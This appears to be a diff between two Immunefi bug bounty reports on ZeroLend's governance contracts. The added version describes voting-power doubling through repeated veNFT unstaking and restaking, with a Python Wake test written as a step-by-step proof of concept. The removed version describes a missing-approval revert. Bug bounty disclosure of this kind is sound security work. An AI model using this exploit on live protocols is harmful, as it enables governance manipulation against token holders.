@@ -1,59 +1,42 @@
 
-# The function always revert if `_stakeNFT == True` due to a missing approval
+# Voting manipulation cause by the possibility to transfer veNFT
 
-Submitted on Sun Mar 10 2024 14:34:07 GMT-0400 (Atlantic Standard Time) by @stiglitz for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)
+Submitted on Sun Mar 10 2024 13:37:05 GMT-0400 (Atlantic Standard Time) by @stiglitz for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)
 
-Report ID: #29213
+Report ID: #29211
 
 Report type: Smart Contract
 
 Target: https://github.com/zerolend/governance
 
 Impacts:
-- Permanent freezing of funds
-- Temporary freezing of funds for at least 1 hour
+- Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results
 
 ## Description
 ## Brief/Intro
-See the function `safeTransferFrom::_createLock`:
+Users stake their veNFT into the contract `OmnichainStaking`; as a result, ERC20 token representing their staking power will be minted.
 
-```solidity
-if (_stakeNFT) {
-        _mint(address(this), _tokenId);
-        bytes memory data = abi.encode(_to);
-        safeTransferFrom(address(this), address(staking), _tokenId, data);
-} else _mint(_to, _tokenId);
+These ERC20 do not allow transfers, which is crucial because in the `PoolVoter` contract, the balance of the staking token is accessed. 
 ```
- if `_stakeNFT == True`, the tx always reverts because `msg.sender` is the user who called `createLock`, and the user does not have approval for moving NFT owned by someone else. As we can see in the code, the NFT is minted to `address(this)`, so the user is not the owner, and he needs approval from the contact. 
+uint256 _weight = staking.balanceOf(who);  
+```
 
-However, the problem imho is the fact that the NFT is not even owned by a user but by the contract itself. Because if approval is implemented to make the transfer succeed, the user has no ability to get what is his.
+The problem is that backing veNFT token can be easily transferred. 
+
+This means that user `A` stakes `X` amount of underlying token to mint `veNFT` in the Locker contract. 
+
+NFT is then sent to the `OmnichainStaking` contract which triggers `onERC721Received` function, and user `A` gets `Y` amount of voting ERC20 token. 
+
+User `A` votes in `PoolVoter`, unstake `veNFT` from `OmnichainStaking` contract, sends it to `B`. 
+
+`B` sends NFT  to the `OmnichainStaking`  and get `Y` of voting tokens. Then `B` votes. This way we doubled the voting power!
+
 
 ## Vulnerability Details
-Let's also look at the `OmnichainStaking::onERC721Received`:
-
-```solidity
-if (msg.sender == address(lpLocker)) {
-        lpPower[tokenId] = lpLocker.balanceOfNFT(tokenId);
-        _mint(from, lpPower[tokenId] * 4);
-}
-```
-
-And also the function `OmnichainStaking::unstakeLP`:
-
-```solidity
-function unstakeLP(uint256 tokenId) external { /
-        _burn(msg.sender, lpPower[tokenId] * 4);
-        lpLocker.safeTransferFrom(address(this), msg.sender, tokenId);
-}
-```
-Lets say we have the approval and we create a lock with `_stakeNFT  == True`. The function `safeTransferFrom` is executed where `from == address(this)` which is `BaseLocker` (`LockerLP`). NOT A USER.
-
-Who is gonna call `unstakeLP` ? The tokens are owner by the `LockerLP` contract, and only the contract can unstake them. 
+Detailed description with steps in PoC. Actions and state changes are printed out. It is also possible to print call_trace, emitted events etc.
 
 ## Impact Details
-The protocol does not work as it is supposed to, and if the function with `_stakeNFT  == True` is called and it works (it does not right now) - The user will basically lose his invested money into veNFT and the voting power will be useless owned by the protocol contract.
-
-I think the impact is very high and I would say critical. But because of the missing approval, the function does not work at all, so the impact is not there :D 
+Vote manipulation
 
 ## References
 Add any relevant links to documentation or code
@@ -61,35 +44,7 @@ Add any relevant links to documentation or code
         
 ## Proof of concept
 ## Proof of Concept
-### Ve mock token
-```solidity
-pragma solidity ^0.8.6;
-
-import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
-
-// Example class - a mock class derived from ERC20
-contract VeToken is ERC20 {
-    constructor(uint256 initialBalance) ERC20("Ve Token", "VT") public {
-        _mint(msg.sender, initialBalance);
-    }
-}
-```
-### Re mock token
-```solidity
-pragma solidity ^0.8.6;
-
-import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
-
-// Example class - a mock class derived from ERC20
-contract ReToken is ERC20 {
-    constructor(uint256 initialBalance) ERC20("Re Token", "RT") public {
-        _mint(msg.sender, initialBalance);
-    }
-}
-
-
-```
-### X contract (ERC721 compatible)
+### X contract
 ```solidity
 import {ILocker} from "../contracts/interfaces/ILocker.sol";
 import {OmnichainStaking} from "../contracts/locker/OmnichainStaking.sol";
@@ -131,7 +86,7 @@ contract X {
     }
 }
 ```
-### Y contract (ERC721 compatible)
+### Y contract
 ```solidity
 import {ILocker} from "../contracts/interfaces/ILocker.sol";
 import {OmnichainStaking} from "../contracts/locker/OmnichainStaking.sol";
@@ -173,8 +128,38 @@ contract Y {
     }
 }
 ```
+### Ve mock token
+```solidity
+pragma solidity ^0.8.6;
 
-### Failing test
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+// Example class - a mock class derived from ERC20
+contract VeToken is ERC20 {
+    constructor(uint256 initialBalance) ERC20("Ve Token", "VT") public {
+        _mint(msg.sender, initialBalance);
+    }
+}
+
+
+```
+### Re mock token
+```solidity
+pragma solidity ^0.8.6;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+// Example class - a mock class derived from ERC20
+contract ReToken is ERC20 {
+    constructor(uint256 initialBalance) ERC20("Re Token", "RT") public {
+        _mint(msg.sender, initialBalance);
+    }
+}
+
+
+```
+### Test
+
 ```python
 from wake.testing import *
 
@@ -212,11 +197,11 @@ It will create `tests` folder and process foundry remappings if any
 Generate python representation of contracts
     $ wake init pytypes
 
-Go to wake `tests` folder and paste this code in tests/test_approval.py and run
-    $ wake test tests/test_approval.py
+Go to wake `tests` folder and paste this code in tests/test_default.py and run
+    $ wake test tests/test_default.py
 
-If you are interest I would be happy to provide more examples + complete protocol deployment and fuzz testing
-(yout tests are not good tbh)
+If you are interested I would be happy to teach Wake and provide complete complete protocol deployment with tests (and fuzz testing)
+contact telegram: @bem1c
 '''
 
 
@@ -232,7 +217,7 @@ def revert_handler(e: TransactionRevertedError):
 
 @default_chain.connect()
 @on_revert(revert_handler)
-def test_approval():
+def test_default():
     # ======================DEPLOY========================= #
     random  = default_chain.accounts[9]
     owner   = default_chain.accounts[0]
@@ -267,14 +252,48 @@ def test_approval():
     amount  = 10*10**18
     # Bob approve locker contract
     ve_token.approve(locker, amount, from_=bob)
-
     # Bob creates lock for X
-    locker.createLockFor(amount, two_weeks,x ,True, from_=bob)
-    # This tx with _stakeNFT == True ALWAYS FAILS
+    locker.createLockFor(amount, two_weeks,x ,False, from_=bob)
+    # Read X's token id
+    toke_id = locker.tokenOfOwnerByIndex(x,0)
+    # Send NFT to omnichain staking
+    x.send(omnichain, toke_id, from_=bob)
+    print('X transfer --> omnichain')
+
+    # X votes in PoolVoter
+    poolVote = [asset]
+    weights  = [1]
+    print('X vote')
+    x.vote(poolVote, weights, from_=bob)
+    print(f'    :: pool_voter.usedWeights(x) == {pool_voter.usedWeights(x)}')
+
+    # HERE IS THE PROOF THAT I CAN MOVE NFTS SO I CAN MOVE VOTING POWER SO I CAN MANIPULATE VOTING
+    # Just X and Y contracts were created so I can double the voting power
+    # but in generel `number of contracts * voting power`
+    print(f'    :: Staking balance X: {omnichain.balanceOf(x)}')
+    # Unstake from staking
+    x.unstakeLP(toke_id, from_=bob)
+    print('X unstake from omnichain')
+    print(f'    :: Staking balance X : {omnichain.balanceOf(x)}')
+    print('X transfer --> Y')
+    # Send from X to Y
+    x.send(y, toke_id, from_=bob)
+    print(f'    :: Staking balance X: {omnichain.balanceOf(x)}')
+    print(f'    :: Staking balance Y: {omnichain.balanceOf(y)}')
+    print('Y transfer --> omnichain')
+    # Send from Y to omnichain
+    y.send(omnichain, toke_id, from_=bob)
+    # Y votes in PoolVoter
+    y.vote(poolVote, weights, from_=bob)
+    print('Y vote')
+    print(f'    :: pool_voter.usedWeights(y) == {pool_voter.usedWeights(y)}')
+    print(f'    :: Staking balance X: {omnichain.balanceOf(x)}')
+    print(f'    :: Staking balance Y: {omnichain.balanceOf(y)}')
+    # How to print call trace example
+    # tx = y.vote(poolVote, weights, from_=bob)
+    # print(tx.call_trace)
 
     # ===================================================== #
-
-
 
 
 ```
